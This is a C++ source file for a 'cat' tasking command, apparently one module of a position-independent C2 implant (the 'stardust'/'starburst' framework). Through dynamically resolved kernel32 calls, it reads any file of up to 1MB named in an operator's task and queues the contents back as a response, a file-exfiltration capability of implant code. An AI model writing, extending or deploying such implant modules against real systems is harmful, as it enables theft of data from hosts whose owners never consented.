#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_CAT

using namespace stardust;
using namespace starburst;

auto declfn starburst::cmd_cat(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    uint32_t path_len = 0;
    auto path = parser_string( params, &path_len );
    if ( !path || path_len == 0 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "no file path" ) ) );
        return;
    }

    char path_buf[520] = { 0 };
    uint32_t copy_len = path_len < 519 ? path_len : 519;
    memory::copy( path_buf, path, copy_len );

    wchar_t wpath[520] = { 0 };
    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path_buf, -1, wpath, 520 );

    HANDLE h_file = inst.kernel32.CreateFileW(
        wpath, GENERIC_READ, FILE_SHARE_READ,
        nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );

    if ( h_file == INVALID_HANDLE_VALUE ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "CreateFileW failed" ) ) );
        return;
    }

    LARGE_INTEGER file_size;
    if ( !inst.kernel32.GetFileSizeEx( h_file, &file_size ) ) {
        inst.kernel32.CloseHandle( h_file );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "GetFileSizeEx failed" ) ) );
        return;
    }

    uint32_t size = static_cast<uint32_t>( file_size.QuadPart );

    // cap at 1MB to avoid OOM
    if ( size > 1048576 ) {
        inst.kernel32.CloseHandle( h_file );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "file too large (>1MB)" ) ) );
        return;
    }

    auto buf = static_cast<char*>( inst.heap_alloc( size + 1 ) );
    if ( !buf ) {
        inst.kernel32.CloseHandle( h_file );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }

    DWORD bytes_read = 0;
    inst.kernel32.ReadFile( h_file, buf, size, &bytes_read, nullptr );
    buf[bytes_read] = '\0';
    inst.kernel32.CloseHandle( h_file );

    queue_response( inst, task_uuid, RESPONSE_SUCCESS, buf );
    inst.heap_free( buf );
}

#endif
